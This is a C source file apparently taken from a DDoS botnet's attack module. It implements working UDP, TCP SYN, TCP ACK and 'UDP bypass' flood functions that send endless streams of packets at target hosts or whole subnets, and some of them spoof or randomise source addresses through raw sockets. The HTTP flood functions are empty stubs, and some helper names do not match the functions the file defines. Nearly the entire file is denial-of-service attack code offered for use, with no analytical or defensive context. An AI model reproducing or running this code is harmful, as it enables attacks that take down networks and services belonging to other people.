#define _GNU_SOURCE

#include <stdint.h>
#include <arpa/inet.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <string.h>
#include <fcntl.h>

#include "command.h"
#include "main.h"
#include "rand.h"
#include "checksum.h"
//#include "resolve.h"
#if SCAN
#include "scan.h"
#endif

uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

int tcp_handshake(const uint16_t port, const int fd, const int dest_addr, const int source_ip, const int source_port) {
    
    const int ttl = 64;
    const int ihl = 5;
    const int version = 4;
    
    int id = rand_new() & 0xffff;
    
    char data[sizeof(struct iphdr) + sizeof(struct tcphdr)] = { 0 };
    char temp[sizeof(struct iphdr) + sizeof(struct tcphdr)] = { 0 };
    
    char recv_buf[512] = { 0 };
    
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    struct sockaddr_in addr;
    
    int ret = 0;
    
    ip_header = (struct iphdr *)data;
    tcp_header = (struct tcphdr *)(ip_header + 1);
    
    ip_header->ihl = ihl;
    ip_header->version = version;
    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip_header->ttl = ttl;
    ip_header->protocol = IPPROTO_TCP;
    
    tcp_header->dest = htons(port);
    tcp_header->source = htons(source_port);
    tcp_header->doff = 5;
    tcp_header->window = rand_new() & 0xffff;
    tcp_header->ack = 0;
    tcp_header->fin = 0;
    tcp_header->urg = 0;
    tcp_header->psh = 0;
    tcp_header->rst = 0;
    tcp_header->syn = 1;
    tcp_header->ack_seq = 0;
    
    ip_header->id = rand_new() & 0xffff;
    ip_header->saddr = source_ip;
    ip_header->daddr = dest_addr;
    
    ip_header->check = 0;
    ip_header->check = checksum_generic((uint16_t *)ip_header, sizeof (struct iphdr));
    
    tcp_header->seq = rand_new() & 0xFFFF;
    tcp_header->check = 0;
    tcp_header->check = checksum_tcpudp(ip_header, tcp_header, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));
    
    addr.sin_family = AF_INET;
    addr.sin_port = tcp_header->dest;
    addr.sin_addr.s_addr = ip_header->daddr;
    

    memcpy(temp, data, sizeof(data)); //temp copy.
    
    printf("Sending SYN with ACK: %d SEQ: %d\n", ntohl(tcp_header->ack_seq), ntohl(tcp_header->seq));
    
    ret = sendto(fd, data, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
    
    if (ret == -1)
    {
        return 0;
    }
    
    ip_header = (struct iphdr *)recv_buf;
    tcp_header = (struct tcphdr *)(ip_header + 1);
    
    int count = 0;
    
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    
    ret =  setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
    
    if (ret == -1)
        return 0;
    
    while(count < 10000) 
    {
        ret = recvfrom(fd, recv_buf, sizeof(recv_buf), MSG_NOSIGNAL, NULL, NULL);
        
        if (ret == -1)
        {
            break;
        }
        
        if (ip_header->saddr == dest_addr && tcp_header->ack == 1 && tcp_header->syn == 1) 
        {
            printf("Received SYN-ACK with ACK: %d SEQ: %d\n", ntohl(tcp_header->ack_seq), ntohl(tcp_header->seq));
            
            int server_ack = htonl(ntohl(tcp_header->seq) + 1);
            int server_seq = tcp_header->ack_seq;
            
            ip_header = (struct iphdr *)temp;
            tcp_header = (struct tcphdr *)(ip_header + 1);
            
            tcp_header->ack = 1;
            tcp_header->fin = 0;
            tcp_header->urg = 0;
            tcp_header->psh = 0;
            tcp_header->rst = 0;
            tcp_header->syn = 0;
            tcp_header->ack_seq = server_ack;
            tcp_header->seq = server_seq;

            ip_header->id = rand_new() & 0xffff;
            ip_header->check = 0; //measure checksum with 0 checksum field
            ip_header->check = checksum_generic((uint16_t *)ip_header, sizeof (struct iphdr));
    
            tcp_header->check = 0;
            tcp_header->check = checksum_tcpudp(ip_header, tcp_header, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

            addr.sin_family = AF_INET;
            addr.sin_port = tcp_header->dest;
            addr.sin_addr.s_addr = ip_header->daddr;
            
            printf("Sending SYN with ACK: %d SEQ: %d\n", ntohl(tcp_header->ack_seq), ntohl(tcp_header->seq));
            ret = sendto(fd, temp, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
            
            break;
        }
        
       count++;
      
    }
    
    return ret == -1 ? 0 : 1;
    
}

void flood_udp(struct arguments *args)
{

    uint16_t size = 0;
    uint16_t port = 0;
    int i = 0;
    char **data;
    int *fds;

    size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 900); // Default size to 900 if not specified
    port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff); // Default to 65535 if port not specified

    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(i = 0; i < args->num_of_targets; i++)
    {
        struct sockaddr_in bind_addr;
        struct sockaddr_in addr;

        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(fds[i] == -1)
        {
            exit(1);
        }

        data[i] = (char *)malloc(size + 1);
        if(!data[i])
        {
            exit(1);
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = rand_new();
        bind_addr.sin_addr.s_addr = 0;

        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(bind_addr));

        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = args->targets[i].netmask < 32 ? (htonl(ntohl(args->targets[i].host) + ((rand_new()) >> (uint32_t)args->targets[i].netmask))) : args->targets[i].host;

        connect(fds[i], (struct sockaddr *)&addr, sizeof(addr));
    
        rand_string(data[i], size);
    }

    while(TRUE)
    {
        for(i = 0; i < args->num_of_targets; i++)
        {
            send(fds[i], data[i], size, MSG_NOSIGNAL);
        }
    }
}

void flood_tcp_syn(struct arguments *args)
{
	
    int x = 0;
    int i = 0;
    uint16_t size = 0;
    uint16_t port = 0;
    uint8_t ttl = 0;
    uint16_t source_port = 0;
    char **data;
    char ack = FALSE;
    char fin = FALSE;
    char urg = FALSE;
    char psh = FALSE;
    char rst = FALSE;
    char syn = FALSE;
    uint8_t tos = 0;
    uint16_t id = 0;
    uint32_t sequence = 0;
    uint32_t source_ip = 0;
    uint32_t ack_sequence = 0;
    char *domain;
    int *fds;
    int handshake = 0;
    
    size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 900);
    port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff);
    ttl = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_TTL, 0xff);
    source_port = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_SOURCE_PORT, 0xffff);
    ack = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_ACK, FALSE);
    fin = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_FIN, FALSE);
    urg = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_URG, FALSE);
    psh = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_PSH, FALSE);
    rst = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_RST, FALSE);
    syn = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_SYN, TRUE);
    tos = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_TOS, 0);
    id = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_ID, 0xffff);
    sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_SEQUENCE, 0xffff);
    source_ip = retrieve_opt_ipv4(args->options, args->num_of_flags, OPT_TCP_SOURCE_IP, LOCAL_ADDRESS);
    ack_sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_ACK_SEQUENCE, 0xffff);
    domain = retrieve_opt_str(args->options, args->num_of_flags, OPT_DOMAIN, NULL);
    handshake = retrieve_opt_str(args->options, args->num_of_flags, OPT_HANDSHAKE, 1);
    
    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        DEBUG_PRINT("Failed to allocate data to initialize the TCP ACK flood\n");
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(x = 0; x < args->num_of_targets; x++)
    {
        struct iphdr *ip_header;
        struct tcphdr *tcp_header;
        char *a;

        fds[x] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(fds[x] == -1)
        {
            DEBUG_PRINT("Failed to create the TCP socket for the flood!\n");
            free(data);
            exit(1);
        }

        i = 1;
        if(setsockopt(fds[x], IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
        {
            DEBUG_PRINT("Failed to set IP_HDRINCL for the TCP flood\n");
            free(data);
            exit(1);
        }

        if (handshake) {
            tcp_handshake(port, fds[x], args->targets[x].host, source_ip, source_port);
        }
        
        data[x] = (char *)malloc(size + 110);
        if(!data[x])
        {
            DEBUG_PRINT("Failed to allocate memory for the TCP flood\n");
            free(data);
            exit(1);
        }
        
        ip_header = (struct iphdr *)data[x];
        tcp_header = (struct tcphdr *)(ip_header + 1);
        a = (char *)(tcp_header + 1);

        // IPv4
        ip_header->version = 4;
        ip_header->tos = tos;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + size);
        ip_header->ihl = 5;
        ip_header->frag_off = 0;
        ip_header->ttl = ttl;
        ip_header->id = htons(id);
        ip_header->protocol = IPPROTO_TCP;
        ip_header->saddr = source_ip;
        ip_header->daddr = args->targets[x].host;

        tcp_header->dest = htons(port);
        tcp_header->source = htons(source_port);
        tcp_header->seq = htons(sequence);
        tcp_header->doff = 5;
        // Set the flag respectively
        tcp_header->ack = ack;
        tcp_header->fin = fin;
        tcp_header->urg = urg;
        tcp_header->psh = psh;
        tcp_header->rst = rst;
        tcp_header->syn = syn;
        tcp_header->window = rand_new() & 0xffff;
        tcp_header->ack_seq = htons(ack_sequence);

        rand_string(a, size);
    }

    while(TRUE)
    {
        for(x = 0; x < args->num_of_targets; x++)
        {
            struct iphdr *ip_header;
            struct tcphdr *tcp_header;
            struct sockaddr_in addr;

            ip_header = (struct iphdr *)data[x];
            tcp_header = (struct tcphdr *)(ip_header + 1);

            if(args->targets[x].netmask < 32)
                ip_header->daddr = htonl(ntohl(ip_header->daddr) + (((uint32_t)rand_new()) >> (uint32_t)args->targets[x].netmask));

            // Specified a random source address
            if(ip_header->saddr == 0xffffffff)
                ip_header->saddr = rand_new() & 0xffffffff;

            // Update the IP header
            if(ip_header->id == 0xffff)
                ip_header->id = rand_new() & 0xffff;

            // Update the TCP header
            if(tcp_header->dest == 0xffff)
                tcp_header->dest = rand_new() & 0xffff;

            if(tcp_header->source == 0xffff)
                tcp_header->source = rand_new() & 0xffff;
            
            if(tcp_header->seq == 0xffff)
                tcp_header->seq = rand_new() & 0xffff;

            if(tcp_header->ack_seq == 0xffff)
                tcp_header->ack_seq = rand_new() & 0xffff;

            // IP header checksum
            ip_header->check = 0;
            ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

            // TCP header checksum
            tcp_header->check = 0;
            tcp_header->check = tcp_udp_header_checksum(ip_header, tcp_header, htons(sizeof(struct tcphdr) + size), sizeof(struct tcphdr) + size);

            // Set the addr
            addr.sin_family = AF_INET;
            addr.sin_port = tcp_header->dest;
            addr.sin_addr.s_addr = ip_header->daddr;

            sendto(fds[x], data[x], sizeof(struct iphdr) + sizeof(struct tcphdr) + size, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }
    }
}

void flood_tcp_ack(struct arguments *args)
{

    int x = 0;
    int i = 0;
    uint16_t size = 0;
    uint16_t port = 0;
    uint8_t ttl = 0;
    uint16_t source_port = 0;
    char **data;
    char ack = FALSE;
    char fin = FALSE;
    char urg = FALSE;
    char psh = FALSE;
    char rst = FALSE;
    char syn = FALSE;
    uint8_t tos = 0;
    uint16_t id = 0;
    uint32_t sequence = 0;
    uint32_t source_ip = 0;
    uint32_t ack_sequence = 0;
    char *domain;
    int *fds;
    int handshake = 0;
    
    size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 900);
    port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff);
    ttl = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_TTL, 0xff);
    source_port = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_SOURCE_PORT, 0xffff);
    ack = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_ACK, TRUE);
    fin = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_FIN, FALSE);
    urg = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_URG, FALSE);
    psh = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_PSH, FALSE);
    rst = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_RST, FALSE);
    syn = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_SYN, FALSE);
    tos = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_TOS, 0);
    id = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_ID, 0xffff);
    sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_SEQUENCE, 0xffff);
    source_ip = retrieve_opt_ipv4(args->options, args->num_of_flags, OPT_TCP_SOURCE_IP, LOCAL_ADDRESS);
    ack_sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_TCP_ACK_SEQUENCE, 0xffff);
    domain = retrieve_opt_str(args->options, args->num_of_flags, OPT_DOMAIN, NULL);
    handshake = retrieve_opt_str(args->options, args->num_of_flags, OPT_HANDSHAKE, 1);
    
    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        DEBUG_PRINT("Failed to allocate data to initialize the TCP ACK flood\n");
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(x = 0; x < args->num_of_targets; x++)
    {
        struct iphdr *ip_header;
        struct tcphdr *tcp_header;
        char *a;

        fds[x] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(fds[x] == -1)
        {
            DEBUG_PRINT("Failed to create the TCP socket for the flood!\n");
            free(data);
            exit(1);
        }

        i = 1;
        if(setsockopt(fds[x], IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
        {
            DEBUG_PRINT("Failed to set IP_HDRINCL for the TCP flood\n");
            free(data);
            exit(1);
        }

        if (handshake) {
            tcp_handshake(port, fds[x], args->targets[x].host, source_ip, source_port);
        }
        
        data[x] = (char *)malloc(size + 110);
        if(!data[x])
        {
            DEBUG_PRINT("Failed to allocate memory for the TCP flood\n");
            free(data);
            exit(1);
        }
        
        ip_header = (struct iphdr *)data[x];
        tcp_header = (struct tcphdr *)(ip_header + 1);
        a = (char *)(tcp_header + 1);

        // IPv4
        ip_header->version = 4;
        ip_header->tos = tos;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + size);
        ip_header->ihl = 5;
        ip_header->frag_off = 0;
        ip_header->ttl = ttl;
        ip_header->id = htons(id);
        ip_header->protocol = IPPROTO_TCP;
        ip_header->saddr = source_ip;
        ip_header->daddr = args->targets[x].host;

        tcp_header->dest = htons(port);
        tcp_header->source = htons(source_port);
        tcp_header->seq = htons(sequence);
        tcp_header->doff = 5;
        // Set the flag respectively
        tcp_header->ack = ack;
        tcp_header->fin = fin;
        tcp_header->urg = urg;
        tcp_header->psh = psh;
        tcp_header->rst = rst;
        tcp_header->syn = syn;
        tcp_header->window = rand_new() & 0xffff;
        tcp_header->ack_seq = htons(ack_sequence);

        rand_string(a, size);
    }

    while(TRUE)
    {
        for(x = 0; x < args->num_of_targets; x++)
        {
            struct iphdr *ip_header;
            struct tcphdr *tcp_header;
            struct sockaddr_in addr;

            ip_header = (struct iphdr *)data[x];
            tcp_header = (struct tcphdr *)(ip_header + 1);

            if(args->targets[x].netmask < 32)
                ip_header->daddr = htonl(ntohl(ip_header->daddr) + (((uint32_t)rand_new()) >> (uint32_t)args->targets[x].netmask));

            // Specified a random source address
            if(ip_header->saddr == 0xffffffff)
                ip_header->saddr = rand_new() & 0xffffffff;

            // Update the IP header
            if(ip_header->id == 0xffff)
                ip_header->id = rand_new() & 0xffff;

            // Update the TCP header
            if(tcp_header->dest == 0xffff)
                tcp_header->dest = rand_new() & 0xffff;

            if(tcp_header->source == 0xffff)
                tcp_header->source = rand_new() & 0xffff;
            
            if(tcp_header->seq == 0xffff)
                tcp_header->seq = rand_new() & 0xffff;

            if(tcp_header->ack_seq == 0xffff)
                tcp_header->ack_seq = rand_new() & 0xffff;

            // IP header checksum
            ip_header->check = 0;
            ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

            // TCP header checksum
            tcp_header->check = 0;
            tcp_header->check = tcp_udp_header_checksum(ip_header, tcp_header, htons(sizeof(struct tcphdr) + size), sizeof(struct tcphdr) + size);

            // Set the addr
            addr.sin_family = AF_INET;
            addr.sin_port = tcp_header->dest;
            addr.sin_addr.s_addr = ip_header->daddr;

            sendto(fds[x], data[x], sizeof(struct iphdr) + sizeof(struct tcphdr) + size, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }
    }
}

void flood_tcp_ack_connect(struct arguments *args)
{

}


void flood_get(struct arguments *args)
{
    return;
}

void flood_post(struct arguments *args)
{
    return;
}

void flood_junk(struct arguments *args)
{
    return;
}

void flood_udpbypass(struct arguments *args)
{
	
    uint16_t size = 0;
    uint16_t port = 0;
    int i = 0;
    char *data;
    int *fds;

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if (!fds)
    {
        exit(1);
    }
    
    for(i = 0; i < args->num_of_targets; i++)
    {
        struct sockaddr_in bind_addr;
        struct sockaddr_in addr;
		
		port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 53 + rand() % (65535 - 53)); // The dport is random if it is not defined.
     
        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] == -1)
        {
            exit(1);
        }
     
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = rand_new();
        bind_addr.sin_addr.s_addr = 0;
     
        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(bind_addr));
     
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = args->targets[i].netmask < 32 ? (htonl(ntohl(args->targets[i].host) + ((rand_new()) >> (uint32_t)args->targets[i].netmask))) : args->targets[i].host;
     
        connect(fds[i], (struct sockaddr *)&addr, sizeof(addr));
    }
    
    int a = 0;
    
    while (TRUE)
    {
        for (i = 0; i < args->num_of_targets; i++)
        {
            size = 1024 + rand() % (1460 - 1024);
            
            data = (char *)malloc(size);
            
            for (a = 0; a < size; a++) {
            data[a] = (char)(rand() & 0xFFFF);
            }
            
            send(fds[i], data, size, MSG_NOSIGNAL);
        }
    }
}

